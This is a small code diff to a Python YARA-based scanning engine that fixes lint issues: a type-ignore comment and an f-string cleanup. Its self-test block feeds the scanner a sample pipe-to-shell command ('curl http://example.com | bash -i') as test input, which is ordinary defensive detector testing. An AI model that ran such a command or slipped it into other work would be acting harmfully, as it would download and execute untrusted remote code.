@@ -491,7 +491,7 @@ class YARAEngine:
             return result
 
         # Check cache
-        cached = self._get_cached(result.target_hash)
+        cached = self._get_cached(result.target_hash)  # type: ignore[arg-type]  # target_hash set in constructor above
         if cached is not None:
             return cached
 
@@ -651,7 +651,7 @@ if __name__ == '__main__':
         test_data = b"curl http://example.com | bash -i"
         result = engine.scan_data(test_data, "test_input")
 
-        print(f"\nScan result:")
+        print("\nScan result:")
         print(f"  Target: {result.target}")
         print(f"  Success: {result.success}")
         print(f"  Duration: {result.scan_duration_ms:.2f}ms")
